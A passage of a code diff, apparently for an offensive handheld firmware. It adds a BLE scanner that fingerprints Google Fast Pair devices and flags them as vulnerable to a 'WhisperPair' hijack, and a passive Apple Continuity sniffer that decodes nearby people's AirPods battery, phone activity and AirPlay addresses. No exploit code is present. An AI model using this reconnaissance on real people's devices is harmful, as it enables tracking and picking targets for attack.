+  for (int i = 0; i < wp_result_count; i++) {
+    if (memcmp(wp_results[i].mac, mac, 6) == 0) return i;
+  }
+  return -1;
+}
+
+class WpScanCallbacks : public BLEAdvertisedDeviceCallbacks {
+public:
+  void onResult(BLEAdvertisedDevice dev) override {
+    // Fast Pair publie le 0xFE2C dans le Service Data (AD 0x16), que
+    // isAdvertisingService() ne teste PAS (il ne regarde que la liste des
+    // service-UUID). On detecte donc aussi via le service data, sinon tous les
+    // Fast Pair sont manques. En mode decouvrable le service data = Model ID
+    // 3 octets (big-endian) ; en non-decouvrable c'est un account-key filter
+    // (autre taille), donc Model ID considere cache.
+    uint32_t mid = 0;
+    bool has = false;
+    bool isFastPair = dev.isAdvertisingService(WP_SVC_UUID);
+    int n = dev.getServiceDataCount();
+    for (int i = 0; i < n; i++) {
+      if (dev.getServiceDataUUID(i).equals(WP_SVC_UUID)) {
+        isFastPair = true;
+        std::string sd = dev.getServiceData(i);
+        if (sd.size() == 3) {
+          mid = ((uint32_t)(uint8_t)sd[0] << 16) |
+                ((uint32_t)(uint8_t)sd[1] << 8)  |
+                 (uint32_t)(uint8_t)sd[2];
+          has = true;
+        }
+        break;
+      }
+    }
+    if (!isFastPair) return;
+
+    uint8_t mac[6];
+    memcpy(mac, dev.getAddress().getNative(), 6);
+    int rssi = dev.getRSSI();
+    esp_ble_addr_type_t at = dev.getAddressType();
+
+    portENTER_CRITICAL(&wp_mux);
+    int idx = wp_find_result(mac);
+    if (idx < 0 && wp_result_count < WP_MAX_RESULTS) {
+      idx = wp_result_count++;
+      memcpy(wp_results[idx].mac, mac, 6);
+      wp_results[idx].modelId = 0;
+      wp_results[idx].hasModelId = false;
+    }
+    if (idx >= 0) {
+      wp_results[idx].atype = at;
+      wp_results[idx].rssi = rssi;
+      wp_results[idx].lastSeen = millis();
+      if (has) {
+        wp_results[idx].modelId = mid;
+        wp_results[idx].hasModelId = true;
+      }
+    }
+    portEXIT_CRITICAL(&wp_mux);
+  }
+};
+
+static WpScanCallbacks wp_scan_cb;
+// Connect over GATT and read the Model ID characteristic for a target whose
+// Model ID was not present in its advertisement. Returns 0 on any failure.
+uint32_t wp_gatt_read_modelid(uint8_t* mac, esp_ble_addr_type_t atype) {
+  // Client REUTILISABLE : detruire un BLEClient dans ce core (Bluedroid) juste
+  // apres un disconnect asynchrone => use-after-free => crash. On le cree une
+  // fois et on ne le detruit jamais.
+  static BLEClient* client = nullptr;
+  if (!client) {
+    client = BLEDevice::createClient();
+    if (!client) return 0;
+  }
+  uint32_t mid = 0;
+  BLEAddress addr(mac);
+  if (client->connect(addr, atype)) {
+    BLERemoteService* svc = client->getService(WP_SVC_UUID);
+    if (svc) {
+      BLERemoteCharacteristic* ch = svc->getCharacteristic(WP_CHAR_MODELID);
+      if (ch && ch->canRead()) {
+        std::string v = ch->readValue();
+        if (v.size() >= 3) {
+          mid = ((uint32_t)(uint8_t)v[0] << 16) |
+                ((uint32_t)(uint8_t)v[1] << 8)  |
+                 (uint32_t)(uint8_t)v[2];
+        }
+      }
+    }
+    client->disconnect();
+    // Attendre la fin effective du disconnect (evite les events sur objet libere)
+    for (int i = 0; i < 50 && client->isConnected(); i++) delay(20);
+  }
+  return mid;   // pas de delete : client reutilise
+}
+// ---- Evil-theme UI (sprite-rendered, matches Totem look) ----
+#define WP_BAR 0x0841   // dark-navy header/footer bar
+
+void wp_draw_list(M5Canvas* sprite, bool use_sprite, int sel, int top) {
+  LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+  const int W = 240, H = 135;
+  uint16_t violet = sp.color565(148, 0, 211);
+
+  int cnt;
+  portENTER_CRITICAL(&wp_mux); cnt = wp_result_count; portEXIT_CRITICAL(&wp_mux);
+
+  sp.fillScreen(TFT_BLACK);
+
+  // header bar
+  sp.fillRect(0, 0, W, 16, WP_BAR);
+  sp.drawFastHLine(0, 16, W, violet);
+  sp.setTextFont(1);
+  sp.setTextSize(1.5);
+  sp.setTextColor(violet, WP_BAR);
+  sp.setCursor(6, 2); sp.print("WhisperPair");
+  sp.setTextSize(1);
+  sp.setTextColor(TFT_WHITE, WP_BAR);
+  sp.setCursor(150, 4); sp.printf("targets:%d", cnt);
+
+  if (cnt == 0) {
+    sp.setTextColor(0x7BEF, TFT_BLACK);
+    sp.setCursor(10, 54); sp.print("Sniffing Fast Pair (0xFE2C)");
+    sp.setTextColor(0x5AEB, TFT_BLACK);
+    sp.setCursor(10, 68); sp.print("Bring a target BT device near");
+  }
+
+  const int lineH = 13;
+  const int listY = 20;
+  const int maxVis = (H - listY - 14) / lineH;   // 7 rows
+  sp.setTextSize(1);
+  for (int i = top; i < top + maxVis && i < cnt; i++) {
+    WpResult r;
+    portENTER_CRITICAL(&wp_mux); r = wp_results[i]; portEXIT_CRITICAL(&wp_mux);
+    int ki = r.hasModelId ? wp_lookup(r.modelId) : -1;
+    const WpKnown* k = (ki >= 0) ? &WP_DB[ki] : nullptr;
+
+    uint16_t col; const char* tag; const char* label;
+    if (k) {
+      col = k->affected ? TFT_RED : TFT_GREEN;
+      tag = k->affected ? "VULN" : "SAFE";
+      label = k->name;
+    } else if (r.hasModelId) {
+      col = TFT_YELLOW; tag = " ?  "; label = "Fast Pair (untested)";
+    } else {
+      col = 0x7BEF; tag = "hid "; label = "Fast Pair (hidden)";
+    }
+
+    int y = listY + (i - top) * lineH;
+    uint16_t bg = TFT_BLACK;
+    if (i == sel) {
+      bg = TFT_NAVY;
+      sp.fillRect(0, y, W, lineH, bg);
+      sp.drawFastVLine(0, y, lineH, violet);
+      sp.drawFastVLine(1, y, lineH, violet);
+    }
+    sp.setTextColor(col, bg);
+    sp.setCursor(5, y + 3); sp.printf("%-4s", tag);
+    sp.setTextColor((i == sel) ? TFT_WHITE : 0xCE79, bg);
+    sp.setCursor(36, y + 3); sp.print(label);
+    sp.setTextColor(col, bg);
+    sp.setCursor(W - 34, y + 3); sp.printf("%ddB", r.rssi);
+  }
+
+  // scroll hint arrows
+  sp.setTextColor(violet, TFT_BLACK);
+  if (top > 0)                 { sp.setCursor(W - 8, listY); sp.print("^"); }
+  if (top + maxVis < cnt)      { sp.setCursor(W - 8, H - 24); sp.print("v"); }
+
+  // footer bar
+  sp.fillRect(0, H - 13, W, 13, WP_BAR);
+  sp.setTextColor(TFT_GREEN, WP_BAR);
+  sp.setCursor(4, H - 11); sp.print("ENTER read");
+  sp.setTextColor(0x5AEB, WP_BAR);
+  sp.setCursor(92, H - 11);  sp.print("i:info");
+  sp.setCursor(150, H - 11); sp.print(";/. BACK");
+
+  if (use_sprite) sprite->pushSprite(0, 0);
+}
+
+void wp_show_detail(M5Canvas* sprite, bool use_sprite, int sel) {
+  LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+  const int W = 240, H = 135;
+  uint16_t violet = sp.color565(148, 0, 211);
+
+  WpResult r;
+  portENTER_CRITICAL(&wp_mux);
+  if (sel < 0 || sel >= wp_result_count) { portEXIT_CRITICAL(&wp_mux); return; }
+  r = wp_results[sel];
+  portEXIT_CRITICAL(&wp_mux);
+  int ki = r.hasModelId ? wp_lookup(r.modelId) : -1;
+  const WpKnown* k = (ki >= 0) ? &WP_DB[ki] : nullptr;
+
+  sp.fillScreen(TFT_BLACK);
+  sp.fillRect(0, 0, W, 16, WP_BAR);
+  sp.drawFastHLine(0, 16, W, violet);
+  sp.setTextFont(1);
+  sp.setTextSize(1.5);
+  sp.setTextColor(violet, WP_BAR);
+  sp.setCursor(6, 2); sp.print("Target Detail");
+
+  sp.setTextSize(1);
+  int y = 22;
+  sp.setTextColor(TFT_WHITE, TFT_BLACK);
+  sp.setCursor(6, y); sp.printf("MAC  %02X:%02X:%02X:%02X:%02X:%02X",
+    r.mac[0], r.mac[1], r.mac[2], r.mac[3], r.mac[4], r.mac[5]); y += 12;
+  sp.setCursor(6, y); sp.printf("RSSI %d dBm", r.rssi); y += 12;
+  sp.setCursor(6, y);
+  if (r.hasModelId) sp.printf("Model %lu", (unsigned long)r.modelId);
+  else              sp.print("Model hidden  (ENTER = read)");
+  y += 14;
+
+  if (k) {
+    sp.setTextColor(TFT_CYAN, TFT_BLACK);
+    sp.setCursor(6, y); sp.print(k->name); y += 13;
+
+    // status banner
+    uint16_t sc = k->affected ? TFT_RED : TFT_GREEN;
+    sp.fillRect(4, y, W - 8, 15, sc);
+    sp.setTextColor(TFT_BLACK, sc);
+    sp.setTextSize(1.5);
+    sp.setCursor(10, y + 2);
+    sp.print(k->affected ? "VULNERABLE - WhisperPair" : "NOT VULNERABLE");
+    sp.setTextSize(1);
+    y += 19;
+
+    const char* nn = (k->nonce == WP_N_YES)     ? "yes"
+                   : (k->nonce == WP_N_SESSION) ? "session" : "no";
+    sp.setTextColor(0xCE79, TFT_BLACK);
+    sp.setCursor(6, y); sp.printf("Nonce reuse: %s", nn); y += 11;
+    sp.setCursor(6, y); sp.printf("Paper hijack time: %s", k->hijack); y += 11;
+  } else if (r.hasModelId) {
+    sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+    sp.setCursor(6, y); sp.print("Fast Pair device (untested)"); y += 12;
+  } else {
+    sp.setTextColor(0x7BEF, TFT_BLACK);
+    sp.setCursor(6, y); sp.print("Not in discoverable mode"); y += 12;
+  }
+
+  // footer
+  sp.fillRect(0, H - 13, W, 13, WP_BAR);
+  sp.setTextColor(0x5AEB, WP_BAR);
+  sp.setCursor(4, H - 11); sp.print("BR/EDR replay N/A on S3");
+  sp.setTextColor(TFT_GREEN, WP_BAR);
+  sp.setCursor(168, H - 11); sp.print("BACK");
+
+  if (use_sprite) sprite->pushSprite(0, 0);
+
+  enterDebounce();
+  while (true) {
+    M5.update();
+    cardUpdate();
+    if (kp(KEY_ENTER) || kp(KEY_BACKSPACE) || kp('i') || kp('I')) { keyRelease(); break; }
+    delay(30);
+  }
+}
+void whisperPairMenu() {
+  keyRelease();
+  M5Canvas* sprite = new (std::nothrow) M5Canvas(&M5.Display);
+  bool use_sprite = false;
+  if (sprite) {
+    sprite->setColorDepth(8);
+    use_sprite = sprite->createSprite(240, 135);
+  }
+
+  WiFi.mode(WIFI_OFF);
+  delay(50);
+  if (!BLEDevice::getInitialized()) BLEDevice::init("");
+  isBLEInitialized = true;
+
+  portENTER_CRITICAL(&wp_mux);
+  wp_result_count = 0;
+  portEXIT_CRITICAL(&wp_mux);
+
+  BLEScan* scan = BLEDevice::getScan();
+  scan->stop();
+  scan->clearResults();
+  scan->setAdvertisedDeviceCallbacks(&wp_scan_cb, true);
+  scan->setActiveScan(true);
+  scan->setInterval(160);
+  scan->setWindow(160);
+  scan->start(0, nullptr, false);
+
+  int sel = 0, top = 0;
+  const int maxVis = 7;
+  uint32_t lastDraw = 0;
+  enterDebounce();
+
+  while (true) {
+    M5.update();
+    cardUpdate();
+
+    if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+
+    int cnt;
+    portENTER_CRITICAL(&wp_mux); cnt = wp_result_count; portEXIT_CRITICAL(&wp_mux);
+
+    if (kp('.') && cnt > 0)      { keyRelease(); sel = (sel + 1) % cnt; lastDraw = 0; }
+    else if (kp(';') && cnt > 0) { keyRelease(); sel = (sel - 1 + cnt) % cnt; lastDraw = 0; }
+
+    if (sel < top) top = sel;
+    if (sel >= top + maxVis) top = sel - maxVis + 1;
+
+    if ((kp('i') || kp('I')) && cnt > 0) {
+      keyRelease();
+      wp_show_detail(sprite, use_sprite, sel);
+      lastDraw = 0;
+    }
+
+    if (kp(KEY_ENTER) && cnt > 0) {
+      keyRelease();
+      // Connexion/decouverte GATT DESACTIVEE : getService() lance la decouverte
+      // complete des services/caracteristiques, ce qui fait deborder la pile de
+      // la tache BTU (Bluedroid) sur les cibles a grosse base GATT (ex. telephone)
+      // -> Stack canary (BTU_TASK) -> crash. La taille de pile BTU est figee dans
+      // la lib BT precompilee du core Arduino (non modifiable). WhisperPair
+      // identifie via le Model ID ANNONCE ; un appareil non-decouvrable reste
+      // "hidden" plutot que de crasher.
+      wp_show_detail(sprite, use_sprite, sel);
+      lastDraw = 0;
+    }
+
+    if (millis() - lastDraw > 400) {
+      lastDraw = millis();
+      wp_draw_list(sprite, use_sprite, sel, top);
+    }
+    delay(20);
+  }
+
+  scan->stop();
+  scan->setAdvertisedDeviceCallbacks(nullptr);
+  scan->clearResults();
+  if (sprite) { sprite->deleteSprite(); delete sprite; }
+  releaseBLE();
+  waitAndReturnToMenu("WhisperPair stopped");
+}
+
+// =====================================================================
+// =================== Apple Continuity BLE Sniffer ===================
+// =====================================================================
+// Passive decoder for Apple's Continuity BLE advertisements (company ID
+// 0x004C). Each advert carries one or more TLV messages [type][len][payload].
+// We decode: 0x07 Proximity Pairing (AirPods model + L/R/case battery +
+// charge + lid), 0x10 Nearby Info (device activity/lock/wifi), 0x0E Tethering
+// Source (hotspot battery/cell), 0x09 AirPlay (IPv4), plus presence of 0x05
+// AirDrop / 0x0C Handoff / 0x08 Hey Siri / 0x0F Nearby Action / 0x12 Find My.
+// Read-only reconnaissance. MACs are randomised (~15 min) so identity is not
+// persistent across rotations. Byte layout per furiousMAC/OpenPods.
+
+struct AcModel { uint16_t id; const char* name; bool single; };
+static const AcModel AC_MODELS[] = {
+  { 0x0220, "AirPods 1",           false },
+  { 0x0F20, "AirPods 2",           false },
+  { 0x1320, "AirPods 3",           false },
+  { 0x1920, "AirPods 4",           false },
+  { 0x1B20, "AirPods 4 ANC",       false },
+  { 0x0E20, "AirPods Pro",         false },
+  { 0x1420, "AirPods Pro 2",       false },
+  { 0x2420, "AirPods Pro 2 USB-C", false },
+  { 0x2720, "AirPods Pro 3",       false },
+  { 0x0A20, "AirPods Max",         true  },
+  { 0x1F20, "AirPods Max USB-C",   true  },
+  { 0x0520, "BeatsX",              true  },
+  { 0x1020, "Beats Flex",          false },
+  { 0x0620, "Beats Solo3",         true  },
+  { 0x0920, "Beats Studio3",       true  },
+  { 0x0320, "Powerbeats3",         true  },
+  { 0x0B20, "Powerbeats Pro",      false },
+};
+static const int AC_MODELS_COUNT = sizeof(AC_MODELS) / sizeof(AC_MODELS[0]);
+
+// int (not AcModel*) so the Arduino auto-prototype does not reference AcModel.
+int ac_model_idx(uint16_t id) {
+  for (int i = 0; i < AC_MODELS_COUNT; i++) if (AC_MODELS[i].id == id) return i;
+  return -1;
+}
+
+#define AC_MAX 30
+struct AcDev {
+  uint8_t  mac[6];
+  int      rssi;
+  uint32_t lastSeen;
+  // Proximity Pairing 0x07
+  bool     hasPods; uint16_t podModel;
+  uint8_t  battL, battR, battC;      // 0..10, 0x0F = unknown
+  bool     chgL, chgR, chgC;
+  uint8_t  lid;
+  // Nearby Info 0x10
+  bool     hasNearby; uint8_t action; uint8_t dataFlags; uint8_t statusFlags;
+  // Tethering Source 0x0E (Instant Hotspot)
+  bool     hasHotspot; uint8_t hsBatt; uint8_t hsBars; uint16_t hsCell;
+  // AirPlay 0x09
+  bool     hasAirplay; uint8_t ip[4];
+  // Handoff 0x0C
+  bool     hasHandoff; uint16_t handoffSeq;
+  // presence flags
+  bool     hasAirdrop, hasSiri, hasNearbyAction, hasFindMy;
+  // BLE Complete/Short Local Name (present only when device is discoverable /
+  // in pairing mode, e.g. "iPhone de X"); empty otherwise.
+  char     name[24];
+};
+
+static AcDev        ac_devs[AC_MAX];
+static volatile int ac_count = 0;
+static portMUX_TYPE ac_mux = portMUX_INITIALIZER_UNLOCKED;
+
+int ac_find(const uint8_t* mac) {
+  for (int i = 0; i < ac_count; i++) if (memcmp(ac_devs[i].mac, mac, 6) == 0) return i;
+  return -1;
+}
+
+class AcScanCallbacks : public BLEAdvertisedDeviceCallbacks {
+public:
+  void onResult(BLEAdvertisedDevice dev) override {
+    std::string md = dev.getManufacturerData();
+    const uint8_t* p = (const uint8_t*)md.data();
+    size_t n = md.size();
+    if (n < 4 || p[0] != 0x4C || p[1] != 0x00) return;   // not Apple Continuity
+
+    uint8_t mac[6];
+    memcpy(mac, dev.getAddress().getNative(), 6);
+    int rssi = dev.getRSSI();
+
+    portENTER_CRITICAL(&ac_mux);
+    int idx = ac_find(mac);
+    if (idx < 0 && ac_count < AC_MAX) { idx = ac_count++; memset(&ac_devs[idx], 0, sizeof(AcDev)); memcpy(ac_devs[idx].mac, mac, 6); }
+    if (idx < 0) { portEXIT_CRITICAL(&ac_mux); return; }
+    AcDev& d = ac_devs[idx];
+    d.rssi = rssi; d.lastSeen = millis();
+
+    // Capture the BLE local name when advertised (keep any previously seen
+    // name; a later nameless advert must not erase it).
+    std::string nm = dev.getName();
+    if (!nm.empty()) { strncpy(d.name, nm.c_str(), sizeof(d.name) - 1); d.name[sizeof(d.name) - 1] = 0; }
+
+    // Walk the concatenated TLV messages after the 2-byte company ID.
+    size_t i = 2;
+    while (i + 2 <= n) {
+      uint8_t type = p[i];
+      uint8_t len  = p[i + 1];
+      const uint8_t* v = p + i + 2;
+      if (i + 2 + len > n) break;                 // truncated — trust length byte
+
+      switch (type) {
+        case 0x07:                                // Proximity Pairing (AirPods)
+          if (len >= 8) {
+            d.hasPods = true;
+            d.podModel = ((uint16_t)v[1] << 8) | v[2];
+            uint8_t status = v[3];
+            bool flip = ((status & 0x20) == 0);
+            uint8_t bb = v[4];
+            uint8_t loN = bb & 0x0F, hiN = (bb >> 4) & 0x0F;
+            d.battL = flip ? hiN : loN;
+            d.battR = flip ? loN : hiN;
+            uint8_t b5 = v[5];
+            d.battC = b5 & 0x0F;
+            uint8_t chg = (b5 >> 4) & 0x0F;
+            bool cL = chg & 0x01, cR = chg & 0x02;
+            d.chgL = flip ? cR : cL;
+            d.chgR = flip ? cL : cR;
+            d.chgC = chg & 0x04;
+            d.lid = v[6];
+          }
+          break;
+        case 0x10:                                // Nearby Info
+          if (len >= 2) {
+            d.hasNearby = true;
+            d.statusFlags = (v[0] >> 4) & 0x0F;
+            d.action = v[0] & 0x0F;
+            d.dataFlags = v[1];
+          }
+          break;
+        case 0x0E:                                // Tethering Source (hotspot)
+          if (len >= 6) {
+            d.hasHotspot = true;
+            d.hsBatt = v[2];
+            d.hsCell = ((uint16_t)v[3] << 8) | v[4];
+            d.hsBars = v[5];
+          }
+          break;
+        case 0x09:                                // AirPlay Target
+          if (len >= 6) { d.hasAirplay = true; memcpy(d.ip, v + 2, 4); }
+          break;
+        case 0x0C:                                // Handoff
+          if (len >= 3) { d.hasHandoff = true; d.handoffSeq = ((uint16_t)v[1] << 8) | v[2]; }
+          break;
+        case 0x05: d.hasAirdrop = true; break;
+        case 0x08: d.hasSiri = true; break;
+        case 0x0F: d.hasNearbyAction = true; break;
+        case 0x12: d.hasFindMy = true; break;
+        default: break;
+      }
+      i += 2 + len;
+    }
+    portEXIT_CRITICAL(&ac_mux);
+  }
+};
+
+static AcScanCallbacks ac_scan_cb;
+
+// ---- decode helpers (primitive params only, to dodge the Arduino
+//      auto-prototype-references-undeclared-type bug) ----
+int ac_batt_pct(uint8_t nib) {           // -1 = unknown
+  if (nib == 0x0F || nib > 10) return -1;
+  return nib * 10;
+}
+
+const char* ac_activity(uint8_t a) {
+  switch (a) {
+    case 0x01: return "reporting off";
+    case 0x03: return "locked/idle";
+    case 0x05: return "audio (locked)";
+    case 0x07: return "active";
+    case 0x09: return "video";
+    case 0x0A: return "watch unlocked";
+    case 0x0B: return "in use";
+    case 0x0D: return "driving";
+    case 0x0E: return "call";
+    default:   return "unknown";
+  }
+}
+
+const char* ac_devtype(bool hasPods, uint16_t podModel, bool hasHotspot,
+                       bool hasAirplay, uint8_t dataFlags, bool hasNearby) {
+  if (hasPods) { int m = ac_model_idx(podModel); return (m >= 0) ? AC_MODELS[m].name : "AirPods (?)"; }
+  if (hasHotspot)        return "iPhone (hotspot)";
+  if (hasAirplay)        return "AirPlay / TV";
+  if (dataFlags & 0x20)  return "Apple Watch";
+  if (hasNearby)         return "iPhone/iPad/Mac";
+  return "Apple device";
+}
+
+// ---- type filters (cycled with left/right) ----
+#define AC_FILTERS 7
+const char* ac_filter_name(int f) {
+  static const char* n[AC_FILTERS] =
+    { "All", "AirPods", "iPhone/iPad/Mac", "Watch", "Hotspot", "AirPlay", "Named" };
+  return (f >= 0 && f < AC_FILTERS) ? n[f] : "All";
+}
+
+bool ac_match(int filter, bool hasPods, bool hasNearby, bool hasHotspot,
+              bool hasAirplay, uint8_t dataFlags, bool named) {
+  switch (filter) {
+    case 0: return true;                                              // All
+    case 1: return hasPods;                                           // AirPods
+    case 2: return (hasNearby || hasHotspot) && !hasPods && !(dataFlags & 0x20); // iPhone/iPad/Mac
+    case 3: return (dataFlags & 0x20);                                // Watch
+    case 4: return hasHotspot;                                        // Hotspot
+    case 5: return hasAirplay;                                        // AirPlay
+    case 6: return named;                                             // Named
+    default: return true;
+  }
+}
+
+// Fill out[] with indices of devices matching the filter; returns count.
+int ac_build_filter(int filter, int* out) {
+  int k = 0;
+  portENTER_CRITICAL(&ac_mux);
+  int n = ac_count;
+  for (int i = 0; i < n; i++) {
+    AcDev& d = ac_devs[i];
+    if (ac_match(filter, d.hasPods, d.hasNearby, d.hasHotspot,
+                 d.hasAirplay, d.dataFlags, d.name[0] != 0)) out[k++] = i;
+  }
+  portEXIT_CRITICAL(&ac_mux);
+  return k;
+}
+
+#define AC_BAR 0x0841   // dark-navy header/footer bar
+
+void ac_draw_list(M5Canvas* sprite, bool use_sprite, int filter,
+                  int* fidx, int fcount, int sel, int top) {
+  LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+  const int W = 240, H = 135;
+  uint16_t violet = sp.color565(148, 0, 211);
+
+  int total;
+  portENTER_CRITICAL(&ac_mux); total = ac_count; portEXIT_CRITICAL(&ac_mux);
+
+  sp.fillScreen(TFT_BLACK);
+  sp.fillRect(0, 0, W, 16, AC_BAR);
+  sp.drawFastHLine(0, 16, W, violet);
+  sp.setTextFont(1);
+  sp.setTextSize(1);
+  sp.setTextColor(violet, AC_BAR);
+  sp.setCursor(4, 3); sp.print("Apple");
+  sp.setTextColor(TFT_YELLOW, AC_BAR);
+  sp.setCursor(44, 3); sp.printf("<%s>", ac_filter_name(filter));
+  sp.setTextColor(TFT_WHITE, AC_BAR);
+  sp.setCursor(198, 3); sp.printf("%d/%d", fcount, total);
+
+  if (fcount == 0) {
+    sp.setTextColor(0x7BEF, TFT_BLACK);
+    sp.setCursor(10, 54);
+    sp.print(total == 0 ? "Sniffing Continuity (0x004C)" : "No device for this filter");
+    sp.setTextColor(0x5AEB, TFT_BLACK);
+    sp.setCursor(10, 68); sp.print(",/. change filter");
+  }
+
+  const int lineH = 13;
+  const int listY = 20;
+  const int maxVis = (H - listY - 14) / lineH;   // 7
+  sp.setTextSize(1);
+  for (int i = top; i < top + maxVis && i < fcount; i++) {
+    AcDev d;
+    portENTER_CRITICAL(&ac_mux); d = ac_devs[fidx[i]]; portEXIT_CRITICAL(&ac_mux);
+
+    uint16_t col;
+    if (d.hasPods)              col = TFT_CYAN;
+    else if (d.hasHotspot)      col = TFT_GREEN;
+    else if (d.dataFlags & 0x20)col = violet;
+    else if (d.hasAirplay)      col = TFT_ORANGE;
+    else                        col = TFT_WHITE;
+
+    const char* type = ac_devtype(d.hasPods, d.podModel, d.hasHotspot,
+                                  d.hasAirplay, d.dataFlags, d.hasNearby);
+
+    // right-hand info: pods battery, or activity, or hotspot batt
+    char info[24];
+    if (d.hasPods) {
+      int l = ac_batt_pct(d.battL), r = ac_batt_pct(d.battR), c = ac_batt_pct(d.battC);
+      snprintf(info, sizeof(info), "L%d R%d C%d",
+               l < 0 ? 0 : l, r < 0 ? 0 : r, c < 0 ? 0 : c);
+    } else if (d.hasHotspot) {
+      snprintf(info, sizeof(info), "batt %d%% %db", d.hsBatt, d.hsBars);
+    } else if (d.hasNearby) {
+      snprintf(info, sizeof(info), "%s", ac_activity(d.action));
+    } else {
+      info[0] = 0;
+    }
+
+    int y = listY + (i - top) * lineH;
+    uint16_t bg = TFT_BLACK;
+    if (i == sel) {
+      bg = TFT_NAVY;
+      sp.fillRect(0, y, W, lineH, bg);
+      sp.drawFastVLine(0, y, lineH, violet);
+      sp.drawFastVLine(1, y, lineH, violet);
+    }
+    // Show the real BLE name when we captured one, else the inferred type.
+    const char* label = d.name[0] ? d.name : type;
+    sp.setTextColor(col, bg);
+    sp.setCursor(4, y + 3); sp.print(label);
+    sp.setTextColor((i == sel) ? TFT_WHITE : 0xCE79, bg);
+    sp.setCursor(120, y + 3); sp.print(info);
+    sp.setTextColor(col, bg);
+    sp.setCursor(W - 34, y + 3); sp.printf("%ddB", d.rssi);
+  }
+
+  sp.setTextColor(violet, TFT_BLACK);
+  if (top > 0)               { sp.setCursor(W - 8, listY); sp.print("^"); }
+  if (top + maxVis < fcount) { sp.setCursor(W - 8, H - 24); sp.print("v"); }
+
+  sp.fillRect(0, H - 13, W, 13, AC_BAR);
+  sp.setTextColor(TFT_GREEN, AC_BAR);
+  sp.setCursor(4, H - 11); sp.print("ENTER info");
+  sp.setTextColor(TFT_YELLOW, AC_BAR);
+  sp.setCursor(84, H - 11); sp.print(",/. filter");
+  sp.setTextColor(0x5AEB, AC_BAR);
+  sp.setCursor(168, H - 11); sp.print(";/. BACK");
+
+  if (use_sprite) sprite->pushSprite(0, 0);
+}
+
+const char* ac_cell(uint16_t t) {
+  switch (t) {
+    case 0: return "GSM"; case 1: return "1xRTT"; case 2: return "GPRS";
+    case 3: return "EDGE"; case 4: return "EV-DO"; case 5: return "3G";
+    case 6: return "4G"; case 7: return "LTE"; default: return "?";
+  }
+}
+
+void ac_batt_bar(LovyanGFX& sp, int x, int y, const char* lbl, int pct, bool chg) {
+  sp.setTextColor(TFT_WHITE, TFT_BLACK);
+  sp.setCursor(x, y + 1); sp.print(lbl);
+  int bx = x + 16, bw = 46, bh = 9;
+  sp.drawRect(bx, y, bw, bh, 0x7BEF);
+  if (pct >= 0) {
+    int fw = (bw - 2) * pct / 100;
+    uint16_t c = pct <= 20 ? TFT_RED : (pct <= 50 ? TFT_ORANGE : TFT_GREEN);
+    sp.fillRect(bx + 1, y + 1, fw, bh - 2, c);
+    sp.setTextColor(TFT_WHITE, TFT_BLACK);
+    sp.setCursor(bx + bw + 4, y + 1);
+    sp.printf("%d%%%s", pct, chg ? " +" : "");
+  } else {
+    sp.setTextColor(0x7BEF, TFT_BLACK);
+    sp.setCursor(bx + bw + 4, y + 1); sp.print("--");
+  }
+}
+
+void ac_draw_detail(M5Canvas* sprite, bool use_sprite, int devIndex, int pos, int fcount) {
+  LovyanGFX& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
+  const int W = 240, H = 135;
+  uint16_t violet = sp.color565(148, 0, 211);
+
+  AcDev d;
+  portENTER_CRITICAL(&ac_mux);
+  if (devIndex < 0 || devIndex >= ac_count) { portEXIT_CRITICAL(&ac_mux); return; }
+  d = ac_devs[devIndex];
+  portEXIT_CRITICAL(&ac_mux);
+
+  sp.fillScreen(TFT_BLACK);
+  sp.fillRect(0, 0, W, 16, AC_BAR);
+  sp.drawFastHLine(0, 16, W, violet);
+  sp.setTextFont(1);
+  sp.setTextSize(1.5);
+  sp.setTextColor(violet, AC_BAR);
+  sp.setCursor(6, 2);
+  sp.print(d.name[0] ? d.name
+           : ac_devtype(d.hasPods, d.podModel, d.hasHotspot, d.hasAirplay, d.dataFlags, d.hasNearby));
+
+  sp.setTextSize(1);
+  sp.setTextColor(TFT_WHITE, AC_BAR);
+  sp.setCursor(202, 4); sp.printf("%d/%d", pos + 1, fcount);
+
+  int y = 20;
+  if (d.name[0]) {
+    sp.setTextColor(0x5AEB, TFT_BLACK);
+    sp.setCursor(4, y);
+    sp.printf("type: %s", ac_devtype(d.hasPods, d.podModel, d.hasHotspot, d.hasAirplay, d.dataFlags, d.hasNearby));
+    y += 11;
+  }
+  sp.setTextColor(0xCE79, TFT_BLACK);
+  sp.setCursor(4, y); sp.printf("%02X:%02X:%02X:%02X:%02X:%02X  %ddB",
+    d.mac[0], d.mac[1], d.mac[2], d.mac[3], d.mac[4], d.mac[5], d.rssi);
+  y += 12;
+
+  if (d.hasPods) {
+    ac_batt_bar(sp, 4,  y, "L", ac_batt_pct(d.battL), d.chgL); y += 11;
+    ac_batt_bar(sp, 4,  y, "R", ac_batt_pct(d.battR), d.chgR); y += 11;
+    ac_batt_bar(sp, 4,  y, "C", ac_batt_pct(d.battC), d.chgC); y += 11;
+    sp.setTextColor(0x5AEB, TFT_BLACK);
+    sp.setCursor(4, y); sp.printf("model 0x%04X  lid#%d", d.podModel, d.lid); y += 12;
+  }
+  if (d.hasNearby) {
+    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+    sp.setCursor(4, y); sp.printf("state: %s", ac_activity(d.action)); y += 11;
+    sp.setTextColor(0xCE79, TFT_BLACK);
+    sp.setCursor(4, y);
+    sp.printf("wifi:%s airdrop-rx:%s watch:%s",
+      (d.dataFlags & 0x04) ? "on" : "off",
+      (d.statusFlags & 0x04) ? "yes" : "no",
+      (d.dataFlags & 0x20) ? "lock" : "-");
+    y += 12;
+  }
+  if (d.hasHotspot) {
+    sp.setTextColor(TFT_ORANGE, TFT_BLACK);
+    sp.setCursor(4, y); sp.printf("hotspot %d%% %s %d bars", d.hsBatt, ac_cell(d.hsCell), d.hsBars); y += 12;
+  }
+  if (d.hasAirplay) {
+    sp.setTextColor(TFT_ORANGE, TFT_BLACK);
+    sp.setCursor(4, y); sp.printf("AirPlay %d.%d.%d.%d", d.ip[0], d.ip[1], d.ip[2], d.ip[3]); y += 12;
+  }
+
+  // presence badges
+  if (d.hasAirdrop || d.hasHandoff || d.hasSiri || d.hasNearbyAction || d.hasFindMy) {
